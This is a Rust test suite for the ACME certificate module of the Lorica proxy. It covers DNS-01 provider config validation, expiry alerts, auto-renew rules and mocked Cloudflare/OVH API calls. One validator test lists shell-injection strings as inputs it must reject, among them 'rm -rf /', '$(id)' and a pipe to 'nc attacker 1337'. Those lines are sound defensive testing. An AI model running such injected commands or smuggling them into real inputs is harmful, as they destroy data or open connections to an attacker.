// Copyright 2026 Rwx-G (Lorica)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Test suite for the `acme` module. Kept as a single module because the
//! `temp_challenge_store` helper and the `AppState` fixture are shared across
//! HTTP-01, DNS-01 and expiry tests.

use std::sync::Arc;
use std::time::Instant;

use dashmap::DashMap;

use super::dns01::acme_dns_base_domain;
use super::dns01_manual::PENDING_DNS_MAX_AGE;
use super::dns_challengers::{
    build_dns_challenger, CloudflareDnsChallenger, DnsChallengeConfig, DnsChallenger,
    OvhDnsChallenger,
};
use super::expiry::check_cert_expiry;
use super::store::AcmeChallengeStore;
use super::types::{PendingDnsChallenge, PendingDnsChallenges};
use super::AcmeConfig;

fn temp_challenge_store() -> AcmeChallengeStore {
    let dir = tempfile::tempdir().expect("tempdir available for test");
    let db_path = dir.keep().join("test-acme.db");
    AcmeChallengeStore::with_db_path(db_path)
}

#[tokio::test]
async fn test_challenge_store_set_get_remove() {
    let store = temp_challenge_store();
    store.set("token1".into(), "auth1".into()).await;
    assert_eq!(store.get("token1").await, Some("auth1".to_string()));
    store.remove("token1").await;
    assert_eq!(store.get("token1").await, None);
}

#[tokio::test]
async fn test_challenge_store_get_nonexistent() {
    let store = temp_challenge_store();
    assert_eq!(store.get("nonexistent").await, None);
}

#[test]
fn test_acme_config_staging_url() {
    let config = AcmeConfig::default();
    assert!(config.staging);
    assert!(config.directory_url().contains("staging"));
}

#[test]
fn test_acme_config_production_url() {
    let config = AcmeConfig {
        staging: false,
        contact_email: None,
    };
    assert!(!config.directory_url().contains("staging"));
    assert!(config.directory_url().contains("acme-v02"));
}

#[test]
fn test_dns_config_valid_cloudflare() {
    let config = DnsChallengeConfig {
        provider: "cloudflare".into(),
        zone_id: "zone123".into(),
        api_token: "token456".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_dns_config_valid_route53() {
    let config = DnsChallengeConfig {
        provider: "route53".into(),
        zone_id: "Z1234567890".into(),
        api_token: "AKIAIOSFODNN7EXAMPLE".into(),
        api_secret: Some("wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY".into()),
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_dns_config_valid_ovh() {
    let config = DnsChallengeConfig {
        provider: "ovh".into(),
        zone_id: String::new(),
        api_token: "app-key-123".into(),
        api_secret: Some("app-secret-456".into()),
        ovh_endpoint: Some("eu.api.ovh.com".into()),
        ovh_consumer_key: Some("consumer-key-789".into()),
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_dns_config_ovh_missing_consumer_key() {
    let config = DnsChallengeConfig {
        provider: "ovh".into(),
        zone_id: String::new(),
        api_token: "app-key-123".into(),
        api_secret: Some("app-secret-456".into()),
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("ovh_consumer_key"));
}

#[test]
fn test_dns_config_ovh_missing_secret() {
    let config = DnsChallengeConfig {
        provider: "ovh".into(),
        zone_id: String::new(),
        api_token: "app-key-123".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: Some("consumer-key-789".into()),
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("api_secret"));
}

#[test]
fn test_dns_config_invalid_provider() {
    let config = DnsChallengeConfig {
        provider: "godaddy".into(),
        zone_id: "zone123".into(),
        api_token: "token456".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("unsupported DNS provider"));
    assert!(err.contains("godaddy"));
}

#[test]
fn test_dns_config_empty_zone_id() {
    let config = DnsChallengeConfig {
        provider: "cloudflare".into(),
        zone_id: "".into(),
        api_token: "token456".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("zone_id"));
}

#[test]
fn test_dns_config_empty_api_token() {
    let config = DnsChallengeConfig {
        provider: "cloudflare".into(),
        zone_id: "zone123".into(),
        api_token: "".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("api_token"));
}

#[test]
fn test_dns_config_route53_missing_secret() {
    let config = DnsChallengeConfig {
        provider: "route53".into(),
        zone_id: "Z1234567890".into(),
        api_token: "AKIAIOSFODNN7EXAMPLE".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("api_secret"));
}

#[test]
fn test_dns_config_route53_empty_secret() {
    let config = DnsChallengeConfig {
        provider: "route53".into(),
        zone_id: "Z1234567890".into(),
        api_token: "AKIAIOSFODNN7EXAMPLE".into(),
        api_secret: Some("".into()),
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("api_secret"));
}

#[tokio::test]
async fn test_build_dns_challenger_cloudflare() {
    let config = DnsChallengeConfig {
        provider: "cloudflare".into(),
        zone_id: "zone123".into(),
        api_token: "token456".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(build_dns_challenger(&config).await.is_ok());
}

#[cfg(feature = "route53")]
#[tokio::test]
async fn test_build_dns_challenger_route53() {
    let config = DnsChallengeConfig {
        provider: "route53".into(),
        zone_id: "Z1234567890".into(),
        api_token: "AKIAIOSFODNN7EXAMPLE".into(),
        api_secret: Some("secret".into()),
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(build_dns_challenger(&config).await.is_ok());
}

/// When the `route53` feature is off, `build_dns_challenger` must
/// surface a clear error rather than silently falling through.
#[cfg(not(feature = "route53"))]
#[tokio::test]
async fn test_build_dns_challenger_route53_disabled_without_feature() {
    let config = DnsChallengeConfig {
        provider: "route53".into(),
        zone_id: "Z1234567890".into(),
        api_token: "AKIAIOSFODNN7EXAMPLE".into(),
        api_secret: Some("secret".into()),
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(
        build_dns_challenger(&config).await.is_err(),
        "route53 provider must return Err when the feature is disabled"
    );
}

#[tokio::test]
async fn test_build_dns_challenger_ovh() {
    let config = DnsChallengeConfig {
        provider: "ovh".into(),
        zone_id: String::new(),
        api_token: "app-key".into(),
        api_secret: Some("app-secret".into()),
        ovh_endpoint: Some("eu.api.ovh.com".into()),
        ovh_consumer_key: Some("consumer-key".into()),
    };
    assert!(build_dns_challenger(&config).await.is_ok());
}

#[tokio::test]
async fn test_build_dns_challenger_invalid() {
    let config = DnsChallengeConfig {
        provider: "invalid".into(),
        zone_id: "zone".into(),
        api_token: "token".into(),
        api_secret: None,
        ovh_endpoint: None,
        ovh_consumer_key: None,
    };
    assert!(build_dns_challenger(&config).await.is_err());
}

#[test]
fn test_pending_dns_challenges_store_and_retrieve() {
    let store: PendingDnsChallenges = Arc::new(DashMap::new());
    store.insert(
        "example.com".to_string(),
        PendingDnsChallenge {
            order_url: "https://acme.example/order/1".into(),
            challenge_urls: vec!["https://acme.example/chall/1".into()],
            txt_records: vec![(
                "_acme-challenge.example.com".into(),
                "abc123".into(),
                "example.com".into(),
            )],
            domains: vec!["example.com".into()],
            account_credentials_json: "{}".into(),
            staging: true,
            contact_email: Some("test@example.com".into()),
            created_at: Instant::now(),
        },
    );

    assert!(store.contains_key("example.com"));
    assert!(!store.contains_key("other.com"));

    let (_, pending) = store
        .remove("example.com")
        .expect("challenge was just inserted for example.com");
    assert_eq!(pending.txt_records[0].1, "abc123");
    assert_eq!(pending.challenge_urls[0], "https://acme.example/chall/1");
    assert!(pending.staging);
    assert!(!store.contains_key("example.com"));
}

#[test]
fn test_pending_dns_challenges_multi_domain() {
    let store: PendingDnsChallenges = Arc::new(DashMap::new());
    store.insert(
        "example.com".to_string(),
        PendingDnsChallenge {
            order_url: "https://acme.example/order/2".into(),
            challenge_urls: vec![
                "https://acme.example/chall/1".into(),
                "https://acme.example/chall/2".into(),
            ],
            txt_records: vec![
                (
                    "_acme-challenge.example.com".into(),
                    "val1".into(),
                    "example.com".into(),
                ),
                (
                    "_acme-challenge.example.com".into(),
                    "val2".into(),
                    "*.example.com".into(),
                ),
            ],
            domains: vec!["example.com".into(), "*.example.com".into()],
            account_credentials_json: "{}".into(),
            staging: false,
            contact_email: None,
            created_at: Instant::now(),
        },
    );

    let (_, pending) = store
        .remove("example.com")
        .expect("multi-domain challenge was inserted for example.com");
    assert_eq!(pending.domains.len(), 2);
    assert_eq!(pending.challenge_urls.len(), 2);
    assert_eq!(pending.txt_records.len(), 2);
    // Both TXT records should target the same _acme-challenge name
    assert_eq!(pending.txt_records[0].0, pending.txt_records[1].0);
}

#[test]
fn test_acme_dns_base_domain() {
    assert_eq!(acme_dns_base_domain("example.com"), "example.com");
    assert_eq!(acme_dns_base_domain("*.example.com"), "example.com");
    assert_eq!(acme_dns_base_domain("*.sub.example.com"), "sub.example.com");
    assert_eq!(acme_dns_base_domain("www.example.com"), "www.example.com");
}

#[test]
fn test_pending_dns_challenge_expiry_check() {
    let pending = PendingDnsChallenge {
        order_url: String::new(),
        challenge_urls: vec![],
        txt_records: vec![],
        domains: vec![],
        account_credentials_json: String::new(),
        staging: false,
        contact_email: None,
        created_at: Instant::now() - std::time::Duration::from_secs(700),
    };
    assert!(pending.created_at.elapsed() > PENDING_DNS_MAX_AGE);
}

#[test]
fn test_pending_dns_challenge_not_expired() {
    let pending = PendingDnsChallenge {
        order_url: String::new(),
        challenge_urls: vec![],
        txt_records: vec![],
        domains: vec![],
        account_credentials_json: String::new(),
        staging: false,
        contact_email: None,
        created_at: Instant::now(),
    };
    assert!(pending.created_at.elapsed() < PENDING_DNS_MAX_AGE);
}

#[tokio::test]
async fn test_check_cert_expiry_dispatches_alerts() {
    use lorica_config::models::{Certificate, GlobalSettings};
    use tokio::sync::Mutex;

    let store =
        lorica_config::ConfigStore::open_in_memory().expect("in-memory ConfigStore should open");

    // Set warning=14, critical=3
    let settings = GlobalSettings {
        cert_warning_days: 14,
        cert_critical_days: 3,
        ..GlobalSettings::default()
    };
    store
        .update_global_settings(&settings)
        .expect("update_global_settings should succeed on fresh store");

    let now = chrono::Utc::now();

    // Cert expiring in 10 days (warning level)
    let warning_cert = Certificate {
        id: "cert-warn".into(),
        domain: "warn.example.com".into(),
        san_domains: vec![],
        fingerprint: "aaa".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "manual".into(),
        not_before: now - chrono::Duration::days(80),
        not_after: now + chrono::Duration::days(10),
        is_acme: false,
        acme_auto_renew: false,
        created_at: now - chrono::Duration::days(80),
        acme_method: None,

        acme_dns_provider_id: None,
    };

    // Cert expiring in 2 days (critical level)
    let critical_cert = Certificate {
        id: "cert-crit".into(),
        domain: "crit.example.com".into(),
        san_domains: vec![],
        fingerprint: "bbb".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "manual".into(),
        not_before: now - chrono::Duration::days(88),
        not_after: now + chrono::Duration::days(2),
        is_acme: false,
        acme_auto_renew: false,
        created_at: now - chrono::Duration::days(88),
        acme_method: None,

        acme_dns_provider_id: None,
    };

    // Cert expiring in 30 days (no alert)
    let safe_cert = Certificate {
        id: "cert-safe".into(),
        domain: "safe.example.com".into(),
        san_domains: vec![],
        fingerprint: "ccc".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after: now + chrono::Duration::days(30),
        is_acme: true,
        acme_auto_renew: true,
        created_at: now - chrono::Duration::days(60),
        acme_method: Some("http01".into()),

        acme_dns_provider_id: None,
    };

    store
        .create_certificate(&warning_cert)
        .expect("create warning_cert should succeed");
    store
        .create_certificate(&critical_cert)
        .expect("create critical_cert should succeed");
    store
        .create_certificate(&safe_cert)
        .expect("create safe_cert should succeed");

    let state = crate::server::AppState {
        store: Arc::new(Mutex::new(store)),
        log_buffer: Arc::new(crate::logs::LogBuffer::new(100)),
        system_cache: Arc::new(Mutex::new(crate::system::SystemCache::new())),
        active_connections: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        started_at: Instant::now(),
        data_dir: std::path::PathBuf::from("/var/lib/lorica"),
        http_port: 8080,
        https_port: 8443,
        config_reload_tx: None,
        worker_metrics: None,
        waf_event_buffer: None,
        waf_engine: None,
        waf_rule_count: None,
        acme_challenge_store: None,
        pending_dns_challenges: Arc::new(DashMap::new()),
        sla_collector: None,
        load_test_engine: None,
        cache_hits: None,
        cache_misses: None,
        ban_list: None,
        cache_backend: None,
        ewma_scores: None,
        backend_connections: None,
        notification_history: None,
        log_store: None,
        aggregated_metrics: None,
        metrics_refresher: None,
        task_tracker: tokio_util::task::TaskTracker::new(),
    };

    let alert_sender = lorica_notify::AlertSender::new(64);
    let mut rx = alert_sender.subscribe();

    check_cert_expiry(&state, &alert_sender).await;

    // Collect all alerts
    let mut alerts = Vec::new();
    while let Ok(event) = rx.try_recv() {
        alerts.push(event);
    }

    // Should have exactly 2 alerts (warning + critical), not 3 (safe cert is >14 days)
    assert_eq!(alerts.len(), 2, "expected 2 alerts, got {}", alerts.len());

    // Find the critical alert
    let crit = alerts
        .iter()
        .find(|a| a.summary.contains("CRITICAL"))
        .expect("should have a CRITICAL alert");
    assert!(crit.summary.contains("crit.example.com"));
    assert_eq!(
        crit.details
            .get("cert_id")
            .expect("test setup: cert_id detail present"),
        "cert-crit"
    );

    // Find the warning alert
    let warn = alerts
        .iter()
        .find(|a| !a.summary.contains("CRITICAL"))
        .expect("should have a warning alert");
    assert!(warn.summary.contains("warn.example.com"));
    assert_eq!(
        warn.details
            .get("cert_id")
            .expect("test setup: cert_id detail present"),
        "cert-warn"
    );
}

#[test]
fn test_ovh_zone_extraction_simple() {
    let (zone, sub) = OvhDnsChallenger::extract_zone_and_subdomain("rwx-g.fr");
    assert_eq!(zone, "rwx-g.fr");
    assert_eq!(sub, "_acme-challenge");
}

#[test]
fn test_ovh_zone_extraction_subdomain() {
    let (zone, sub) = OvhDnsChallenger::extract_zone_and_subdomain("bastion.rwx-g.fr");
    assert_eq!(zone, "rwx-g.fr");
    assert_eq!(sub, "_acme-challenge.bastion");
}

#[test]
fn test_ovh_zone_extraction_deep_subdomain() {
    let (zone, sub) = OvhDnsChallenger::extract_zone_and_subdomain("a.b.rwx-g.fr");
    assert_eq!(zone, "rwx-g.fr");
    assert_eq!(sub, "_acme-challenge.a.b");
}

// --- is_valid_dns_server ---
//
// The predicate guards the `@server` argument passed to `dig`
// inside `check_txt_record`. A lax whitelist here would turn into
// a shell-injection pivot, so the filter has to reject every
// meta-character we could imagine. Tests are split per intent so
// a regression pinpoints the exact bypass.

use super::dns01_manual::is_valid_dns_server;

#[test]
fn is_valid_dns_server_accepts_ipv4() {
    assert!(is_valid_dns_server("8.8.8.8"));
    assert!(is_valid_dns_server("1.1.1.1"));
    assert!(is_valid_dns_server("192.168.1.1"));
}

#[test]
fn is_valid_dns_server_accepts_ipv6_with_brackets() {
    assert!(is_valid_dns_server("[2001:4860:4860::8888]"));
    assert!(is_valid_dns_server("[::1]"));
}

#[test]
fn is_valid_dns_server_accepts_hostname() {
    assert!(is_valid_dns_server("ns1.example.com"));
    assert!(is_valid_dns_server("dns-02.cloudflare.com"));
}

#[test]
fn is_valid_dns_server_rejects_empty() {
    assert!(!is_valid_dns_server(""));
}

#[test]
fn is_valid_dns_server_rejects_too_long() {
    let too_long = "a".repeat(254);
    assert!(!is_valid_dns_server(&too_long));
}

#[test]
fn is_valid_dns_server_rejects_shell_metacharacters() {
    assert!(!is_valid_dns_server("8.8.8.8; rm -rf /"));
    assert!(!is_valid_dns_server("`whoami`"));
    assert!(!is_valid_dns_server("$(id)"));
    assert!(!is_valid_dns_server("8.8.8.8 && echo pwned"));
    assert!(!is_valid_dns_server("8.8.8.8|nc attacker 1337"));
}

#[test]
fn is_valid_dns_server_rejects_whitespace() {
    assert!(!is_valid_dns_server("8.8.8.8 "));
    assert!(!is_valid_dns_server(" 8.8.8.8"));
    assert!(!is_valid_dns_server("8.8\t8.8"));
}

#[test]
fn is_valid_dns_server_rejects_quotes_and_slashes() {
    assert!(!is_valid_dns_server("'8.8.8.8'"));
    assert!(!is_valid_dns_server("\"8.8.8.8\""));
    assert!(!is_valid_dns_server("8.8.8.8/24"));
    assert!(!is_valid_dns_server("8.8.8.8\\n"));
}

// --- should_auto_renew ---
//
// Pure predicate extracted from the renewal loop so the filtering
// logic can be tested without spinning a background task or
// touching the network. Each test pins one of the four rules so
// a regression says exactly which branch changed.

use super::renewal::should_auto_renew;

fn renewal_cert_fixture(
    now: chrono::DateTime<chrono::Utc>,
    days_until_expiry: i64,
    is_acme: bool,
    auto_renew: bool,
    acme_method: Option<&str>,
) -> lorica_config::models::Certificate {
    lorica_config::models::Certificate {
        id: "cert-fixture".into(),
        domain: "example.com".into(),
        san_domains: vec![],
        fingerprint: "deadbeef".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after: now + chrono::Duration::days(days_until_expiry),
        is_acme,
        acme_auto_renew: auto_renew,
        created_at: now - chrono::Duration::days(60),
        acme_method: acme_method.map(String::from),
        acme_dns_provider_id: None,
    }
}

#[test]
fn should_auto_renew_rejects_non_acme() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, false, true, None);
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_rejects_opted_out() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, true, false, Some("http01"));
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_rejects_dns01_manual() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, true, true, Some("dns01-manual"));
    assert!(
        !should_auto_renew(&cert, now, 30),
        "dns01-manual certs must never be auto-renewed, the operator has to confirm the TXT record"
    );
}

#[test]
fn should_auto_renew_accepts_http01_inside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 10, true, true, Some("http01"));
    assert!(should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_dns01_cloudflare_inside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 10, true, true, Some("dns01-cloudflare"));
    assert!(should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_exactly_at_threshold() {
    let now = chrono::Utc::now();
    // The cert expires in exactly `threshold_days + 1` hours so
    // `(not_after - now).num_days()` rounds down to `threshold`.
    let not_after = now + chrono::Duration::days(30) + chrono::Duration::hours(1);
    let cert = lorica_config::models::Certificate {
        id: "cert-edge".into(),
        domain: "edge.example.com".into(),
        san_domains: vec![],
        fingerprint: "ff".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after,
        is_acme: true,
        acme_auto_renew: true,
        created_at: now - chrono::Duration::days(60),
        acme_method: Some("http01".into()),
        acme_dns_provider_id: None,
    };
    assert!(
        should_auto_renew(&cert, now, 30),
        "cert at exactly the threshold must qualify (predicate is <=, not <)"
    );
}

#[test]
fn should_auto_renew_rejects_outside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 60, true, true, Some("http01"));
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_already_expired() {
    let now = chrono::Utc::now();
    // Negative remaining days must still trigger renewal : an
    // expired cert is the most urgent renewal case, not a no-op.
    let cert = renewal_cert_fixture(now, -1, true, true, Some("http01"));
    assert!(should_auto_renew(&cert, now, 30));
}

// --- DNS challenger HTTP coverage via wiremock ---
//
// These tests replace the provider's API with a local mock server,
// so the challenger code path (URL shape, auth header, JSON
// payload, 4xx error mapping) gets exercised without hitting the
// real Cloudflare / OVH endpoints. Each challenger carries a
// pub(crate) `with_base_url` constructor that points at the mock
// origin ; the production constructor plugs in the real base URL.

use wiremock::matchers::{body_json, header, method, path, query_param};
use wiremock::{Mock, MockServer, ResponseTemplate};

#[tokio::test]
async fn cloudflare_create_txt_happy_path() {
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/zones/zone123/dns_records"))
        .and(header("Authorization", "Bearer token456"))
        .and(header("Content-Type", "application/json"))
        .and(body_json(serde_json::json!({
            "type": "TXT",
            "name": "_acme-challenge.example.com",
            "content": "value-abc",
            "ttl": 120,
        })))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "success": true,
            "result": {"id": "rec-id-1"},
        })))
        .expect(1)
        .mount(&server)
        .await;

    let cf =
        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
    cf.create_txt_record("example.com", "value-abc")
        .await
        .expect("create should succeed on 200");
}

#[tokio::test]
async fn cloudflare_create_txt_surfaces_4xx_with_body() {
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/zones/zone123/dns_records"))
        .respond_with(ResponseTemplate::new(401).set_body_string(
            r#"{"success":false,"errors":[{"code":10000,"message":"Authentication error"}]}"#,
        ))
        .expect(1)
        .mount(&server)
        .await;

    let cf =
        CloudflareDnsChallenger::with_base_url("zone123".into(), "bad-token".into(), server.uri());
    let err = cf
        .create_txt_record("example.com", "val")
        .await
        .expect_err("401 must map to Err");
    assert!(err.contains("401"), "error must carry the status: {err}");
    assert!(
        err.contains("Authentication error"),
        "error must carry the response body for operator diagnostics: {err}"
    );
}

#[tokio::test]
async fn cloudflare_delete_txt_happy_path() {
    let server = MockServer::start().await;

    // 1. GET to look up the existing record
    Mock::given(method("GET"))
        .and(path("/zones/zone123/dns_records"))
        .and(query_param("type", "TXT"))
        .and(query_param("name", "_acme-challenge.example.com"))
        .and(header("Authorization", "Bearer token456"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "success": true,
            "result": [{"id": "rec-xyz", "name": "_acme-challenge.example.com"}],
        })))
        .expect(1)
        .mount(&server)
        .await;

    // 2. DELETE against the resolved record id
    Mock::given(method("DELETE"))
        .and(path("/zones/zone123/dns_records/rec-xyz"))
        .and(header("Authorization", "Bearer token456"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "success": true,
            "result": {"id": "rec-xyz"},
        })))
        .expect(1)
        .mount(&server)
        .await;

    let cf =
        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
    cf.delete_txt_record("example.com")
        .await
        .expect("delete should succeed when record exists");
}

#[tokio::test]
async fn cloudflare_delete_txt_missing_record_is_err() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/zones/zone123/dns_records"))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "success": true,
            "result": [],
        })))
        .expect(1)
        .mount(&server)
        .await;

    let cf =
        CloudflareDnsChallenger::with_base_url("zone123".into(), "token456".into(), server.uri());
    let err = cf
        .delete_txt_record("example.com")
        .await
        .expect_err("empty GET result should surface as Err, not silent success");
    assert!(
        err.contains("not found"),
        "error should mention the missing record: {err}"
    );
}

#[tokio::test]
async fn ovh_create_txt_happy_path_signs_every_request() {
    let server = MockServer::start().await;

    // OVH signs each request with a server-provided timestamp.
    // Three rounds are needed: (1) /auth/time + POST /record for
    // the create call, (2) /auth/time + POST /refresh for zone
    // refresh, with get_server_time hit twice.
    Mock::given(method("GET"))
        .and(path("/1.0/auth/time"))
        .respond_with(ResponseTemplate::new(200).set_body_string("1700000000"))
        .expect(2)
        .mount(&server)
        .await;

    Mock::given(method("POST"))
        .and(path("/1.0/domain/zone/example.com/record"))
        .and(header("X-Ovh-Application", "app-key"))
        .and(header("X-Ovh-Consumer", "consumer-key"))
        .and(body_json(serde_json::json!({
            "fieldType": "TXT",
            "subDomain": "_acme-challenge",
            "target": "challenge-value",
            "ttl": 60,
        })))
        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
            "id": 42u64,
            "fieldType": "TXT",
            "subDomain": "_acme-challenge",
            "target": "challenge-value",
            "ttl": 60,
        })))
        .expect(1)
        .mount(&server)
        .await;

    Mock::given(method("POST"))
        .and(path("/1.0/domain/zone/example.com/refresh"))
        .and(header("X-Ovh-Application", "app-key"))
        .respond_with(ResponseTemplate::new(200).set_body_string(""))
        .expect(1)
        .mount(&server)
        .await;

    let ovh = OvhDnsChallenger::with_base_url(
        format!("{}/1.0", server.uri()),
        "app-key".into(),
        "app-secret".into(),
        "consumer-key".into(),
    );
    ovh.create_txt_record("example.com", "challenge-value")
        .await
        .expect("happy-path create must succeed");
}

#[tokio::test]
async fn ovh_create_txt_surfaces_4xx_with_body() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/1.0/auth/time"))
        .respond_with(ResponseTemplate::new(200).set_body_string("1700000000"))
        .mount(&server)
        .await;
    Mock::given(method("POST"))
        .and(path("/1.0/domain/zone/example.com/record"))
        .respond_with(ResponseTemplate::new(403).set_body_json(serde_json::json!({
            "class": "Client::Forbidden",
            "message": "This credential is not valid",
        })))
        .expect(1)
        .mount(&server)
        .await;

    let ovh = OvhDnsChallenger::with_base_url(
        format!("{}/1.0", server.uri()),
        "app-key".into(),
        "app-secret".into(),
        "bad-consumer-key".into(),
    );
    let err = ovh
        .create_txt_record("example.com", "val")
        .await
        .expect_err("403 must map to Err");
    assert!(err.contains("403"), "error must carry the status: {err}");
    assert!(
        err.contains("credential"),
        "error must carry the response body: {err}"
    );
}

#[tokio::test]
async fn ovh_delete_without_tracked_record_is_err() {
    // No mock server needed: the challenger rejects the delete
    // before sending a request, because the create path was never
    // called so `created_records` is empty. Pins the "don't silently
    // succeed on a missing record" contract.
    let ovh = OvhDnsChallenger::with_base_url(
        "http://127.0.0.1:1/1.0".into(),
        "app-key".into(),
        "app-secret".into(),
        "consumer-key".into(),
    );
    let err = ovh
        .delete_txt_record("example.com")
        .await
        .expect_err("delete without a prior create must return Err");
    assert!(
        err.contains("no tracked"),
        "error should name the missing-id condition: {err}"
    );
}
